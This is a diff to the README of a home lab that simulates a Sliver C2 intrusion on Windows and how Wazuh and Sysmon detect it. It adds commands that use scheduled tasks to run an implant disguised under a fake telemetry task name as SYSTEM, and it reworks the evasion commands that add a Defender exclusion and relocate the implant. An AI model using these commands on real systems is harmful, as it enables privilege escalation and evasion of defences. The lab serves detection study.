@@ -4,7 +4,7 @@
 
 ---
 
-## 📋 Overview
+##  Overview
 
 This project documents a full **attack simulation lab** built from scratch, covering:
 
@@ -18,7 +18,7 @@ The goal was to understand how a real attacker operates post-compromise and how 
 
 ---
 
-## 🏗️ Lab Architecture
+##  Lab Architecture
 
 ```
 ┌─────────────────────────────────────────────────────┐
@@ -48,7 +48,7 @@ The goal was to understand how a real attacker operates post-compromise and how 
 
 ---
 
-## 🔧 Setup & Configuration
+##  Setup & Configuration
 
 ### 1. Wazuh Manager (Ubuntu Server)
 
@@ -84,7 +84,7 @@ See [`rules/local_rules.xml`](rules/local_rules.xml) for the full ruleset.
 
 ---
 
-## ⚔️ Attack Chain
+##  Attack Chain
 
 ### Phase 1 — Payload Generation (Sliver C2)
 
@@ -119,16 +119,41 @@ sliver > http  # Start HTTP listener
 
 A Sliver session opened on the attacker machine. Commands like `shell`, registry modifications, and process injection were attempted — **all detected by Wazuh/Sysmon**.
 
+
+### Phase 3b — Privilege Escalation to SYSTEM (Scheduled Task Abuse)
+
+With an admin session open, `getsystem` in Sliver failed to produce a SYSTEM
+shell. Instead, a scheduled task was used to spawn a process under
+`NT AUTHORITY\SYSTEM`:
+
+\```cmd
+# Create a one-time task running as SYSTEM
+schtasks /create /tn "WindowsTelemetryUpdate" /tr "C:\Windows\Temp\DiagTrackHost.exe" /sc once /st 00:00 /ru "NT AUTHORITY\SYSTEM" /f
+
+# Force immediate execution
+schtasks /run /tn "WindowsTelemetryUpdate" /f
+
+# Clean up the task (payload stays in memory)
+schtasks /delete /tn "WindowsTelemetryUpdate" /f
+\```
+
+**Why it works:** Windows treats scheduled task creation by an admin as routine
+activity. Running a task as `NT AUTHORITY\SYSTEM` causes Windows to spawn the
+process with a SYSTEM token, effectively escalating privileges without any
+exploit.
+
+**MITRE ATT&CK:** T1053.005 — Scheduled Task/Job
+
 ### Phase 4 — Evasion & Relocation
 
 With Wazuh Manager temporarily stopped (simulating a detection gap), the implant was relocated to a less-monitored directory and added to Windows Defender exclusions:
 
 ```
 # Add folder exclusion via Sliver shell
-Add-MpPreference -ExclusionPath "C:\Windows\Tracing"
+execute powerhsell.exe -Command "Add-MpPreference -ExclusionPath 'C:\Windows\Tracing'"
 
 # Move and rename the implant
-C:\Users\GuestWindows\Downloads\diagtrackhost.exe → C:\Windows\Tracing\DiagTrackHost.exe
+mv C:\Users\GuestWindows\Downloads\diagtrackhost.exe → C:\Windows\Tracing\DiagTrackHost.exe
 ```
 
 `C:\Windows\Tracing` is a real Windows folder used by diagnostic tracing, making it a low-suspicion location for hiding a malicious binary.
@@ -155,7 +180,7 @@ schtasks /create /tn "DiagnosticaSistemaTask" /tr "C:\Windows\Tracing\DiagTrackH
 
 ---
 
-## 🛡️ Detection Analysis
+##  Detection Analysis
 
 ### What Wazuh Caught
 
@@ -185,7 +210,7 @@ schtasks /create /tn "DiagnosticaSistemaTask" /tr "C:\Windows\Tracing\DiagTrackH
 
 ---
 
-## 📚 Key Takeaways
+##  Key Takeaways
 
 1. **Sysmon + Wazuh is a strong combo** — nearly every post-exploitation action was flagged when the stack was active.
 2. **SIEM availability is a control** — stopping the Wazuh Manager created a blind spot. In production, this maps to monitoring the monitoring itself.
@@ -195,7 +220,7 @@ schtasks /create /tn "DiagnosticaSistemaTask" /tr "C:\Windows\Tracing\DiagTrackH
 
 ---
 
-## 🗂️ Repository Structure
+##  Repository Structure
 
 ```
 lab-c2-detection/
@@ -212,7 +237,7 @@ lab-c2-detection/
 
 ---
 
-## 🔗 References
+##  References
 
 - [Wazuh Documentation](https://documentation.wazuh.com/)
 - [Sliver C2 Framework](https://github.com/BishopFox/sliver)
